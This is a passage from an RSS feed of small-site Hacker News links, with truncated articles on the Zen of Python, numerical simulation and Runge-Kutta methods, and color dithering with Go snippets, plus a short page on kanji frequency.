  Before creating more tracker items, please take time to learn about how Python‚Äôs history, how it is used, and its cultural norms.  In particular, read the Zen of Python, consider what is meant by duck-typing, what is meant by ‚Äúa consenting adults language‚Äù, what is meant by over-specification, etc.  Python is quite different from Java in this regard. [13]
</p></blockquote>
<p>There‚Äôs also a practical aspect to it. It‚Äôs popular because it works [14]. It‚Äôs the golden guiding principle in pretty much everything Python.</p>
<p>Finally are the Zen points rules? What are they really. Many people take the Zen for rules. The ‚Äòmost opinionated linter ever‚Äô at one time actually included the Zen to back their views [9]. It was situations like these which prompted me to write: The Zen Of Python Is A Joke And Here Is Why [10]. It was nice enough for Michael Kennedy and Brian Okken to call it a ‚Äòmust read‚Äô on PythonBytes [11].</p>
<p>According to Nick Coghlan, the Zen gives you the idea, not everything [12]:</p>
<blockquote><p>
  This<br>
  challenge is reflected in the fact that the Zen of Python is<br>
  deliberately self-contradictory, as it articulates competing design<br>
  principles to take into consideration, rather than being able to<br>
  provide ironclad rules that avoid the need for human judgement in<br>
  determining which of those design guidelines are most salient in any<br>
  given situation.
</p></blockquote>
<p>Self contradiction is also coincidentally, one of the criticised aspect of Strunk and White [17].<br>
The Zen also goes beyond coding, such as shaping the thought pattern of features [12]:</p>
<blockquote><p>
  The thing we work toward as core developers, and aspiring core<br>
  developers, is good design intuition that aligns with the Zen of<br>
  Python. That doesn‚Äôt mean we‚Äôre all going to be able to perfectly<br>
  articulate that intuition in every case, and even when we can, those<br>
  explanations are themselves generally going to be backed by intuition<br>
  rather than rigorous scientific research.
</p></blockquote>
<p>If ever i myself would have added a 20th one it would have been: ‚ÄúUse your judgement.‚Äù. But Nick illustrated it better.</p>
<p>As for the famous <code>import this</code> command, it was Barry Warsaw‚Äôs pick. He sneaked it in a this.py in 2001 along with the ROT13 obfuscation [16]. He also mentionned that it was a time ‚Äòwhen the Python community had a sense of humor‚Äô.</p>
<p><img src="https://images.unsplash.com/photo-1561739091-9d698cb277ec?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=750&amp;q=80" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></p>

<p>Now the time is ripe to see what the Zen actually means. But before we should know that whatever the words<br>
and concepts mean in the Zen is not ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.pythonkitchen.com/zen-of-python-in-depth/">https://www.pythonkitchen.com/zen-of-python-in-depth/</a></em></p>]]>
            </description>
            <link>https://www.pythonkitchen.com/zen-of-python-in-depth/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120869</guid>
            <pubDate>Sat, 13 Feb 2021 02:25:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Simulations Work]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26120686">thread link</a>) | @janpaul123
<br/>
February 12, 2021 | http://www.anuncommonlab.com/articles/how-simulations-work/ | <a href="https://web.archive.org/web/*/http://www.anuncommonlab.com/articles/how-simulations-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page"><h2>Intro</h2><p>People use computer simulations to both understand the world and design for it. Those who need to know where a satellite will be at some future time build simulations of the forces acting on the satellite and propagate its motion from some known location and velocity. Those who design robots create simulations of the environments their robots will experience in order to test how the robots make decisions and move. And those designing power plants simulate weather, energy demand, and system failures to determine the best design for a range of conditions and uncertainty.</p><p>However, despite the importance and widespread applicability, few receive education on the subject. The best information is scattered in places one might not know to look, and even most simulation textbooks are narrowly targeted to specific applications or tools. The inevitable result is that many simulations suffer from basic problems that have easy solutions.</p><p>This article will set out the critical aspects of building good simulations ‚Äî that is, simulations that are accurate, easy to develop and analyze, and fast. The first sections deal with how a simulation evolves over time, as this is the core of any simulation. Further sections deal with details that make simulations easier to develop, faster, and applicable to a large number of variations. The target audience is engineers, scientists, and programmers, whether new to creating simulations or experienced. A tiny amount of vector math and calculus is assumed, making this text accessible to first- and second-year undergraduates. By the end, the reader should be able to begin building quality simulations, avoid common pitfalls, communicate the reasons for their decisions to peers, and know where to look for additional resources on specific topics and for the mathematical rigor behind it all.</p><p>We'll start with the motivation for understanding the core of how systems evolve over time.</p><h2 id="TToDt">From \(t\) to \(t+\Delta t\)</h2><p>Let‚Äôs get started with a really basic example. Let‚Äôs say we have a little moon orbiting a big planet. At some time, we know its position and velocity, and from this we want to simulate the future trajectory.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon_illustration.png"><figcaption>Planet and moon</figcaption></figure><p>We know the planet pulls on the moon with gravity, so the moon‚Äôs acceleration at any point in time is:</p><p>$$\vec{a}(t) = -\frac{GM}{r(t)^2} \hat{\vec{r}}(t)$$</p><p>Here, \(\vec{a}(t)\) is the acceleration vector, \(\vec{r}(t)\) is the position of the moon with respect to the center of mass of the planet, \(\hat{\vec{r}}\) denotes a unit vector in the direction of \(\vec{r}\), \(r\) denotes the magnitude of \(\vec{r}\), and \(GM\) is the gravitational constant of the planet (remember high school?). Let‚Äôs ignore all other forces that might act on the moon for now, since this is overwhelmingly the biggest. How do we turn this into a simulator? It might seem obvious: if we know \(\vec{r}(t)\) and \(\vec{v}(t)\) for some \(t\), then at some time later, \(t + \Delta t\), if \(\vec{v}\) and \(\vec{a}\) are nearly constant across this \(\Delta t\), we would have:</p><p>$$\vec{v}(t + \Delta t) \approx \vec{v}(t) + \vec{a}(t) \Delta t$$
$$\vec{r}(t + \Delta t) \approx \vec{r}(t) + \vec{v}(t) \Delta t + \frac{1}{2} \vec{a}(t) \Delta t^2$$</p><p>Perhaps by taking a series of small \(\Delta t\) and updating the position and velocity along the way, we'll generate the future trajectory. That certainly seems easy enough, so let's try it out. We'll pick a moon in a circular orbit about the planet. It has a period, \(T\), of 30 time units (we can call them days, but it doesn't really matter) and is located at 1 distance unit from the planet. Since it's a circular orbit, the velocity has magnitude of \(2 \pi / T\) and is perpendicular to the vector from the planet to the moon. Finally, \(GM = \left(\frac{2\pi}{T}\right)^2\). We'll take a series of time steps, each \(\Delta t\) in length. Let's use \(\Delta t\) = 1 time unit, so there should be 30 time steps in the orbit, bringing the moon exactly back to where it started. Here are the results using the ‚Äúmultiply by \(\Delta t\)‚Äù method above, plotted on top of the actual future trajectory.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon2.png"><figcaption>Initial simulation</figcaption></figure><p>It's not a very good circle. What went wrong?</p><p>Let's zoom in on the very first time step. Note that as the moon moves, the acceleration should change to always point towards the planet, but since we've assumed the acceleration is constant across \(\Delta t\), the acceleration in this step is always to the left in this figure. This doesn't affect the position all that much, but look at the velocity compared to the true velocity (since this system has a closed form solution, we can compare to an exact value for truth). The stepped velocity wasn't ‚Äúpulled back‚Äù towards the planet enough (since it always pulled left). The result is that the moon is now going a little too fast and to the outside of the true trajectory. This image is not to scale so that we might better see the small difference in the two velocities at the upper left.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon1.png"><figcaption>First time step</figcaption></figure><p>As this continues, the velocity will always have a systematic error, leaning to the outside with every step. The error builds up rapidly, and so our simulated trajectory is not useful. Of course, we used a really big time step. Only 30 time steps for the whole trajectory? That seems ambitious. Let's cut the time step down by a factor of 2. And then by another factor of 2. And then again, again, again, and again.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon3.png"><figcaption>Multiple time steps</figcaption></figure><p>With our smallest time step above we're now taking 1920 time steps, and still the error is huge (given that these are planets).</p><p>Now let's fix it. Note that the stepped trajectory is always to the outside, no matter how small the time step. What if we used some method of stepping that wouldn't have this outward tendency? Something that would take a step, see that the new acceleration is significantly different from the acceleration of the previous step, and figure out what the acceleration was across the time step? Fortunately, some great mathematicians have figured out excellent, all-purpose ways to do this. For example, applying one of the most common and all-purpose methods (it's not tailored to orbits in any way), we can achieve less error than our most precise time step above with only 11 steps. Yes, 11. These are plotted as dots on top of the true trajectory below. Let's find out how.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon4.png"><figcaption>Multiple time steps with a much better solution</figcaption></figure><h2 id="ODEs">Ordinary Differential Equations</h2><p>First, we need to establish what types of things we're going to propagate. When we have systems with some <dfn>state</dfn> (like position and velocity) at some time and we calculate the derivatives of that state (velocity and acceleration for the example) at that time, we call this an <dfn>ordinary differential equation</dfn> (ODE) (and when we're dealing with motion, we call this the <dfn>equation of motion</dfn>). We usually stick all of the parts of the state together into a column matrix and call it the <dfn>state vector</dfn>.</p><p>$$ x(t) = \begin{bmatrix} \vec{r}(t) \\ \vec{v}(t) \end{bmatrix}$$</p><p>Then we have this for the time derivative:</p><p>$$ \frac{d x(t)}{dt} \equiv \dot{x}(t) = \begin{bmatrix} \vec{v}(t) \\ \vec{a}(t) \end{bmatrix}$$</p><p>Then we describe the ODE something like this:</p><p>$$ \dot{x}(t) = f(t, x(t))$$
which just states that the derivatives depend on time and the current state and nothing else. It's also common to drop the explicit dependence on time, because it's generally understood. For our example, we have:
$$ \dot{x} = f(x) = \begin{bmatrix} \vec{v} \\ -\frac{GM}{r^2} \hat{\vec{r}} \end{bmatrix} $$</p><p>When we're keeping track of position by simulating its acceleration, it's a <dfn>second-order system</dfn>, because acceleration is the second-derivative of position. However, in terms of the state vector, \(x\), it's a <dfn>first-order system</dfn> (we calculate \(\dot{x}\) and not \(\ddot{x}\)). This can cause confusion, so we should just remember that the system is ultimately second-order, and we're just conveniently packaging up everything into \(x\) so as to use first-order techniques on \(x\).</p><p>In general, \(f(x)\) is our model of something, which might be nonlinear and even stochastic. The only assumption we make about the whole system is that it's differentiable (smooth-ish). It probably doesn't have a closed-form solution or we'd use the closed-form solution instead of simulating (our circular orbit of course has a closed-form solution, but that's just so that we can compare our simulation to something exact).</p><p>We'll talk about other types of systems (things that aren't ODEs) later. For now, this gives us plenty of great material since a plethora of physical systems are described as ODEs that boil down to \(\dot{x} = f(x)\), such as equations of motion, chemical reactions, thermodynamics, population growth, etc. Having a generic framework to describe these systems therefore lets us describe the solvers in a generic way, making them applicable to a great number of different problems.</p><h2 id="FixedStep">Fixed-Step Solvers</h2><p>In the orbit example, we held the acceleration constant across the time step, and this ultimately created a systemic bias to one side. Of course, we could easily have seen that the acceleration wasn't constant across the time step. For instance, we could have propagated by one time step, re-calculated the acceleration, and used this updated value to determine how the acceleration had changed across the time step, allowing us to revise the step. Drawing from this motivation, an excellent solution was created by Carl Runge and Martin Wilhelm Kutta a long while back. They proposed taking a series of small steps forward, using the derivatives along the way to determine the effective derivatives across the entire time step in such a way that the errors could be made very, very small.</p><h3>Runge-Kutta Fourth Order Method</h3><p>The most common Runge-Kutta method is known as ‚Äúthe‚Äù fourth order method, and we'll call it RK4. It involves calculating the derivatives four times like so:</p><ol><li>First, calculate the derivative at \(t\), 
$$ k_1 = f(t, x(t)) $$</li><li>Form an intermediate update of the state, 
$$ x(t + \frac{1}{2} ‚Ä¶</li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.anuncommonlab.com/articles/how-simulations-work/">http://www.anuncommonlab.com/articles/how-simulations-work/</a></em></p>]]>
            </description>
            <link>http://www.anuncommonlab.com/articles/how-simulations-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120686</guid>
            <pubDate>Sat, 13 Feb 2021 01:39:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ditherpunk 2 ‚Äì beyond 1-bit]]>
            </title>
            <description>
<![CDATA[
Score 182 | Comments 57 (<a href="https://news.ycombinator.com/item?id=26120631">thread link</a>) | @makeworld
<br/>
February 12, 2021 | https://www.makeworld.gq/2021/02/dithering.html | <a href="https://web.archive.org/web/*/https://www.makeworld.gq/2021/02/dithering.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <a rel="me" href="https://sunbeam.city/@makeworld"></a>
    <header>
        <h3><span>www.makeworld.gq</span></h3>
        <nav>
<a href="https://www.makeworld.gq/">Home</a>
<a href="https://www.makeworld.gq/about/">About</a>
<a href="https://www.makeworld.gq/blog/">Blog</a>

        </nav>
    </header>
    
    
    
    
    <p>Feb 12th, 2021<br>
by <strong>makeworld</strong></p>

<p><em>Last updated: Feb. 13, 2021</em></p>

<hr>

<p><em>This post contains some images that need to be viewed at 100% size to be seen correctly. If you normally browse
at a higher zoom level than 100%, please zoom out when you get to any of the images.</em></p>

<hr>

<p>Just yesterday, I released my <a href="https://github.com/makeworld-the-better-one/dither">dithering library</a>, written in Go.
It‚Äôs the product of many hours of research, experimentation, and refactoring. I‚Äôm
excited that it‚Äôs finally out, and to see what people create with it. Personally I‚Äôd like to create a CLI dithering
tool at some point that uses it.</p>

<p>Creating this library required research into the different algorithms for dithering, and how to implement them.
Unfortunately, not all of that knowledge is easily found. It‚Äôs spread across blog posts, Wikipedia pages without
citations, old books, and code comments. Recently, Surma wrote an article called
<a href="https://surma.dev/things/ditherpunk/">Ditherpunk ‚Äî The article I wish I had about monochrome image dithering</a>.
It is an invaluable resource that combines lots of knowledge about dithering into one place. The main thing missing
from the post, however, is going beyond ‚Äúmonochrome‚Äù. Surma shows us how to dither with a 1-bit palette of black and
white, but what about more shades of gray? What about colour images? With this blog post I‚Äôd like to explore those
techniques, taking them out of my code and into English, so you can easily apply them elsewhere.</p>

<p><strong>First off, please read Surma‚Äôs post.</strong> It explains what dithering is, how it works, and many different algorithms.
I don‚Äôt feel the need to explain these again, but merely add on what I‚Äôve learned.</p>

<h2 id="before-we-start">Before we start</h2>

<p>An HN commenter <a href="https://news.ycombinator.com/item?id=26122642">informed me</a> that you cannot accurately represent
linear RGB with just 8-bits (0-255), you need at least 12. Because of this, I have updated the blog post to use
16-bit color (0-65535), and will be updating the library shortly. Make sure you do this in your code too!</p>

<h2 id="overview">Overview</h2>

<p>Dithering operations consist of at least two steps, applied to each pixel. Sometimes there are further steps, like
‚Äúmodify these nearby pixels‚Äù, but these are the basic ones.</p>

<ol>
  <li>Modify the pixel‚Äôs colour value.</li>
  <li>Find the colour in the palette that is ‚Äúclosest‚Äù to that modified value and use that on the output image.</li>
</ol>

<p>Now, we know from Surma‚Äôs post that step 1 must be done with linear RGB values. Otherwise, different values will be
affected differently ‚Äì for example adding 5 to each colour won‚Äôt affect all colours the same way.</p>

<p>But what about step 2? How do we find the closest colour in the palette? In 1-bit dithering we don‚Äôt have to worry
about this, because anything above 0.5 is white, and anything below is black. But when your palette colours can be
anyhere in a 3D space, it is something that needs to be figured out.</p>

<p>Perhaps surprisingly, we‚Äôre not looking for a way that matches human perception. In fact, we are using Euclidean
distance with linear RGB values, which doesn‚Äôt match human perception at all! Why is this?
Thomas Mansencal (<a href="https://github.com/KelSolaar">@KelSolaar</a>) explains it best:</p>

<blockquote>
  <p>You can factor out the observer [the human] because what you are interested in here is basically energy
conservation. The idea being that for a given pool of radiant power emitters, if you remove a certain number of
them, by how much must the radiant power of the remaining ones be increased to be the same as that of the full
pool. It is really a ratio and doing those operations in a linear space is totally appropriate!</p>
</blockquote>

<p>This helped it click for me. Dithering can be thought of as trying to reconstruct the ‚Äúradiant power‚Äù of the original
pixel colours, while restricted to a certain set of ‚Äúemitters‚Äù, aka the palette colours. It is only with linearized
RGB values that we can properly measure the radiant power.</p>

<h2 id="random-noise-grayscale">Random Noise (grayscale)</h2>

<p>Random noise is a good one to start with, to show the differences between 1-bit dithering and larger palettes.</p>

<p>Surma does this by basically just adding a random number from -0.5 to 0.5, and then thresholding it.</p>

<div><div><pre><code><span>grayscaleImage</span><span>.</span><span>mapSelf</span><span>(</span><span>brightness</span> <span>=&gt;</span>
  <span>brightness</span> <span>+</span> <span>(</span><span>Math</span><span>.</span><span>random</span><span>()</span> <span>-</span> <span>0.5</span><span>)</span> <span>&gt;</span> <span>0.5</span> 
    <span>?</span> <span>1.0</span> 
    <span>:</span> <span>0.0</span>
<span>);</span>
</code></pre></div></div>

<p>In my library, there are two separate random noise functions. One is for grayscale, and one is for RGB. The grayscale
one looks like this:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>max</span><span>-</span><span>min</span><span>)</span><span>+</span><span>min</span><span>))</span>
</code></pre></div></div>

<p>The math with <code>min</code> and <code>max</code> is just to put the random value in the desired range. If we clean that up it‚Äôs more
understandable:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>rand</span><span>())</span>
</code></pre></div></div>

<p><code>rand()</code> just represents a function that does whatever range we want, -0.5 to 0.5 in this case.</p>

<p>So, obviously this is quite similar to what Surma does. The heavy lifing of the dithering in this case is done by the
other code, the part that finds the best palette colour.</p>

<p>The main thing that‚Äôs worth noting here is how the rounding works. <code>roundClamp</code> rounds the value to an integer, and then
clamps it to the range 0-65535. But how is the rounding done?</p>

<p>Another <a href="https://news.ycombinator.com/item?id=26122642">HN commenter</a> shared <a href="http://www.cplusplus.com/articles/1UCRko23/">this link</a>
which discusses different rounding methods, and the problems with the way rounding is often done. The best solution is to
use a rounding function that does this:</p>

<blockquote>
  <p>Given a number exactly halfway between two values, round to the even value (zero is considered even here).</p>

  <p>round( 1.7 ) ‚Äì&gt; 2 round( 2.7 ) ‚Äì&gt; 3<br>
round( 1.5 ) ‚Äì&gt; 2 round( 2.5 ) ‚Äì&gt; 2<br>
round( 1.3 ) ‚Äì&gt; 1 round( 2.3 ) ‚Äì&gt; 2</p>
</blockquote>

<p>This is not really about dithering, but this is a pretty important point to get things right mathematically.
Make sure you do it! Otherwise your outputs will be biased.</p>

<h2 id="random-noise-rgb">Random Noise (RGB)</h2>

<p>Back to random noise, but for colour this time.</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxR</span><span>-</span><span>minR</span><span>)</span><span>+</span><span>minR</span><span>))</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxG</span><span>-</span><span>minG</span><span>)</span><span>+</span><span>minG</span><span>))</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxB</span><span>-</span><span>minB</span><span>)</span><span>+</span><span>minB</span><span>))</span>
</code></pre></div></div>

<p>And simplified:</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randR</span><span>())</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randG</span><span>())</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randB</span><span>())</span>
</code></pre></div></div>

<p>Pretty simple, it just adds randomness in each channel. This can be done with grayscale images too, but it won‚Äôt
work very well, because grayscale colours only actually have one dimension. So it will just not add as much
randomness as you would expect.</p>

<p>Also note that usually you‚Äôll want the random ranges to be the same for R, G, and B.</p>

<p>Here‚Äôs an example:</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/random_noise_rgb_red-green-black.png">
<figcaption>
Random Noise (palette is red, green, black)
</figcaption>
</figure>

</section>

<h2 id="ordered-dithering">Ordered Dithering</h2>

<h3 id="modifying-threshold-matrices">Modifying threshold matrices</h3>

<p>Most of the resources online that talk about ordered dithering talk about a ‚Äúthreshold matrix‚Äù. ‚ÄúThresholding‚Äù is
how these matrices are applied for 1-bit dithering. You divide the matrix by whatever number is specified, scale
it to the colour value range, and compare it to each pixel in the image. If it‚Äôs less than the matrix value, make
it black, otherwise white. Obviously this doesn‚Äôt work with any other kind of palette. So what‚Äôs the solution?</p>

<p><a href="https://en.wikipedia.org/wiki/Ordered_dithering">Wikipedia</a> offers an answer. Unfortunately there‚Äôs no citation,
but I‚Äôve confirmed independently that it works. Here it is with some of my own math added as well.</p>

<span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>65535</mn><mo>√ó</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo stretchy="false">)</mo><mo>√ó</mo><mrow><mo fence="true">(</mo><mfrac><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi><mo>+</mo><mn>1</mn></mrow><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></mfrac><mo>‚àí</mo><mn>0.5</mn><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">(65535 \times strength) \times \left( \frac{cell + 1}{max} - 0.5 \right)</annotation></semantics></math></span></span></span>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi></mrow><annotation encoding="application/x-tex">cell</annotation></semantics></math></span></span> is a single cell of the matrix.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> is a percentage, usually a float from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>. It‚Äôs the amount the matrix will be applied to the
image. The closer to zero it is, the smaller the range of input colors that will be dithered. Colors outside
that range will be quantized. Usually you‚Äôll want a strength of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>, to apply the matrix and dither fully, but
sometimes reducing it can be useful, to reduce noise in the output image. It is inversely proportional to contrast ‚Äì
that is, when you reduce the <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span>, it is visually similar to increasing the contrast.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> can also be negative, from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>‚àí</mo><mn>1.0</mn></mrow><annotation encoding="application/x-tex">-1.0</annotation></semantics></math></span></span>. This is useful in certain cases where the matrix usually
makes things bright, like what Surma describes with Bayer matrices.</p>

<p>Note that <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>65535</mn></mrow><annotation encoding="application/x-tex">65535</annotation></semantics></math></span></span> is multiplied by <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> because the colours in my code are in the range <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>65535</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, 65535]</annotation></semantics></math></span></span>. If yours
are different you can change that number.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">max</annotation></semantics></math></span></span> is the value the entire matrix is divided by. It represents the maximum value of the matrix, and normalizes
it by dividing. Usually this is the product of the dimensions of the matrix. It can also be the
largest value in the matrix plus one.</p>

<p>The result of applying this operation to each cell of the matrix is a new, precalculated matrix, which can be added
to a pixel‚Äôs colour value for dithering. Adding 0.5 does not need to happen in this case. In my library, I call the
function that does this <code>convThresholdToAddition</code>, because that‚Äôs essentially the purpose of this ‚Äì converting
a threshold matrix into one that can be used for addition.</p>

<p><strong>Note:</strong> This is designed for matrices that range from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo>‚àí</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">max - 1</annotation></semantics></math></span></span>. If you‚Äôre using a matrix you found that
starts at <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span></span>, you‚Äôll usually just want to subtract one from each value when you program it, then apply the operation
I described above.</p>

<h3 id="using-a-modified-matrix">Using a modified matrix</h3>

<p>Now that you‚Äôve modified the matrix so it can be used for addition, it needs to be applied to the image. This is pretty
simple. Use modulus so the matrix values are tiled across the image, and add the same value in the R, G, and B channels.
If you‚Äôre using a grayscale image you can just apply it in the one channel, or still use RGB. Since the same value is
being added it doesn‚Äôt make much of a difference. Like always, make sure to clamp the values to the proper colour range.</p>

<p>Doing all of this definitely works with colour images, but it‚Äôs not the greatest. Here‚Äôs an example, where the palette
is red, green, and black.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>Here it is where the palette is red, green, black, and yellow.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-yellow-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-yellow-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>As you can see, it doesn‚Äôt really emulate any of the yellow in the first example, while Floyd-Steinberg can. Once yellow is added
to the palette it looks pretty good though.</p>

<h2 id="error-diffusion-dithering">Error diffusion dithering</h2>

<p>Error‚Ä¶</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.makeworld.gq/2021/02/dithering.html">https://www.makeworld.gq/2021/02/dithering.html</a></em></p>]]>
            </description>
            <link>https://www.makeworld.gq/2021/02/dithering.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120631</guid>
            <pubDate>Sat, 13 Feb 2021 01:29:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[With 777 Kanji, 90% Coverage of Kanji in the Wild]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 28 (<a href="https://news.ycombinator.com/item?id=26120559">thread link</a>) | @sova
<br/>
February 12, 2021 | https://japanesecomplete.com/777 | <a href="https://web.archive.org/web/*/https://japanesecomplete.com/777">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            
            
            <p data-wow-delay="0.5s">With 777  of the most frequent kanji, one has 90.0% coverage of Kanji in the wild!</p>
            <p data-wow-delay="1.55s">With 1477 kanji one has 98.0% coverage, and with 2477 characters one has 99.9% coverage</p>
            <p data-wow-delay="3.05s">Based on the Balanced Corpus of Contemporary Japanese from 2011, these 777 kanji characters are the most frequent kanji in the Japanese language today.  By learning these kanji first, and in this order, one is maximizing their learning efficacy and will immediately see these kanji in native Japanese media, as they occur the most often across all domains (literature, poetry, science, politics, technology, television, novels, and more).</p>

          </div>
        </div></div>]]>
            </description>
            <link>https://japanesecomplete.com/777</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120559</guid>
            <pubDate>Sat, 13 Feb 2021 01:15:43 GMT</pubDate>
        </item>
    </channel>
</rss>
